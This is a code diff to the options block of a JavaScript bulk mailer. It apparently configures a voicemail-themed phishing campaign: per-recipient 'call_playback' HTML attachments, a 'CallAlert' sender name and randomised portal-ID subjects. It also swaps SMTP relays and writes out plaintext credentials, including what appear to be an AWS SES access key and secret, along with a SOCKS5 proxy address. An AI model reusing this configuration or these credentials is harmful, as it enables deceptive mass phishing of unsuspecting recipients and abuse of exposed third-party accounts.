@@ -99,15 +99,15 @@ function replacePlaceholders(content, placeholders) {
 
 const options = {
   method: 'SMTP', // Options: 'SMTP', 'MX'
-  useAuthentication: false,
+  useAuthentication: true,
   useProxy: false,
   proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
-  smtpHost: 'gwtsbg-com0i.mail.protection.outlook.com',
+  smtpHost: 'email-smtp.ap-northeast-2.amazonaws.com',
   smtpPort: 25,
   smtpSecure: false,
   secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
-  smtpUsername: 'cradle.etono',
-  smtpPassword: 'nvpx3355',
+  smtpUsername: 'AKIAZTM3XEHWBD73JOW7',
+  smtpPassword: 'BCKkCiiGjKx3mEm0d25gweHOUddk0EyvKkP9cJTU2u2k',
   proxyHost: '63.160.189.222',
   proxyPort: 35149,
   proxyUsername: 'user',
@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['office@gwt-sbg.com'];
+const senderAddresses = ['submit@nj-qs.com'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "CallAlert"; 
 const subjectLineWithPlaceholders = "New V.M.A-Portal ID-{RANDOM_MD5}";
